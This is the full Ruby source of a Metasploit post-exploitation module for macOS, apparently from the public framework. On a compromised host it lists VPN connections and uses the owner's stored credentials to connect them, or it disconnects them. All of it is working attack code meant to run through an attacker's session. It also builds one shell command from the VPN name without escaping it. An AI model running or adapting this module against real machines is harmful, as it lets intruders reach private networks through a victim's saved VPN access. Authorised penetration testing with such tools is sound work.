##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  STR_CONNECTED = '* (Connected)'
  STR_DISCONNECTED = '* (Disconnected)'

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'OSX VPN Manager',
        'Description'   => %q{
          This module lists VPN connections and tries to connect to them using stored credentials.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
          [
            'Peter Toth <globetother[at]gmail.com>'
          ],
        'Platform'      => [ 'osx' ],
        'SessionTypes'  => [ 'shell', 'meterpreter' ],
        'Actions'       => [
          [ 'LIST',     { 'Description' => 'Show a list of VPN connections' } ],
          [ 'CONNECT', { 'Description' => 'Connect to a VPN using stored credentials' } ],
          [ 'DISCONNECT', { 'Description' => 'Disconnect from a VPN' } ]
        ],
        'DefaultAction' => 'LIST'
      ))

    register_options(
      [
        OptString.new('VPN_CONNECTION', [true, 'Name of VPN connection. `set ACTION LIST` to get a list.', 'OSX_VPN']),
        OptString.new('SCUTIL_PATH', [true, 'Path to the scutil executable.', '/usr/sbin/scutil']),
        OptString.new('NETWORKSETUP_PATH', [true, 'Path to the networksetup executable.', '/usr/sbin/networksetup'])
      ])

  end

  def run
    fail_with(Failure::BadConfig, "Invalid action") if action.nil?

    scutil_path = datastore['SCUTIL_PATH'].shellescape
    networksetup_path = datastore['NETWORKSETUP_PATH'].shellescape
    vpn_name = datastore['VPN_CONNECTION']

    if not file?(scutil_path)
      print_error("Aborting, scutil binary not found.")
      return
    end

    if not file?(networksetup_path)
      print_error("Aborting, networksetup binary not found.")
      return
    end

    # Fetch the list of configured VPN connections
    cmd_list = "#{scutil_path} --nc list"
    vprint_status(cmd_list)
    vpn_data = cmd_exec(cmd_list)
    connected_names = parse_vpn_connection_names(vpn_data, :connected)
    disconnected_names = parse_vpn_connection_names(vpn_data, :disconnected)

    if action.name == 'LIST'
      if connected_names.length > 0
        print_status("VPN Connections Status: UP")
        connected_names.each do |vpn_name|
          print_good('  ' + vpn_name)
        end
      end
      if disconnected_names.length > 0
        print_status("VPN Connections Status: DOWN")
        disconnected_names.each do |vpn_name|
          print_good('  ' + vpn_name)
        end
      end
    elsif action.name == 'CONNECT'
      if connected_names.include?(vpn_name)
        print_status("#{vpn_name} already connected")
        return
      end

      unless disconnected_names.include?(vpn_name)
        print_error("#{vpn_name} not found")
        return
      end

      cmd_up = "#{networksetup_path} -connectpppoeservice '#{vpn_name}'"
      vprint_status(cmd_up)
      cmd_exec(cmd_up)
    elsif action.name == 'DISCONNECT'
      if disconnected_names.include?(vpn_name)
        print_status("#{vpn_name} already disconnected")
        return
      end

      unless connected_names.include?(vpn_name)
        print_error("#{vpn_name} not found")
        return
      end

      identifier = parse_vpn_connection_identifier(vpn_data, vpn_name)
      unless identifier
        print_error("Could not parse #{vpn_name} identifier")
        return
      end
      cmd_down = "#{scutil_path} --nc stop #{identifier}"
      vprint_status(cmd_down)
      cmd_exec(cmd_down)
    end
  end

  def parse_vpn_connection_names(data, type=:connected)
    lines = data.lines
    connection_names = []
    comp_str = type == :connected ? STR_CONNECTED : STR_DISCONNECTED

    lines.each do |line|
      if line.start_with?(comp_str) && line =~ /"(.*)"/
        connection_names << $1
      end
    end
    return connection_names
  end

  def parse_vpn_connection_identifier(data, vpn_name)
    lines = data.lines
    lines.each do |line|
      line.strip!
      next if line.empty?
      if line.include?(vpn_name) && line =~ /([0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12})/
        identifier = $1
        return identifier
      end
    end
    return nil
  end
end
